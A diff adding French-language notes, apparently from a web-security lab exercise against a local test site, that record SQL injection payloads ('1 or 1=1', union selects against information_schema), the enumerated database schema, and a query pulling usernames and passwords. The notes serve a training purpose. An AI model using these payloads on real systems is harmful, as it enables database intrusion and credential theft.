@@ -1,0 +1,71 @@
+Informations pour la page "select member by id":
+Requetes testées: 1 or 1 = 1 -- 1 or 1=1 union select 1,2 from information_schema.tables -- 1 or 1=1 union select 1,2 from jenmimi
+
+Si on encode les strings en hexa on peut les passer a la requete
+user : borntosec
+
+
+DB :
+Member_Brute_Force
+Member_Sql_Injection
+Member_guestbook
+Member_images
+Member_survey
+
+
+Member_Brute_Force :
+db_default :
+id
+username
+password
+
+Member_Sql_Injection :
+users :
+user_id
+first_name
+last_name
+town
+country
+planet
+Commentaire
+countersign
+
+Member_guestbook :
+guestbook :
+id_comment
+comment
+name
+
+Member_images :
+list_images :
+url
+title
+comment
+
+Member_survey :
+vote_dbs :
+id_vote
+vote
+nb_vote
+subject
+
+
+login :
+http://192.168.61.128/index.php?page=signin&username=test&password=yoyoyo&Login=Login#
+
+
+Recuperer toutes les colonnes et toutes les tables :
+1 union select table_name, column_name from information_schema.columns
+
+
+Recuperer logins et mdp :
+1 union select username, password from Member_Brute_Force.db_default
+
+Le site tourne sous nginx
+TODO: compléter l'explication du unrestricted_file_upload
+
+
+
+Il reste quoi :
+numero chelou scrapper (99dde1d35d1fdd283924d84e6d9f1d820)
+tamere
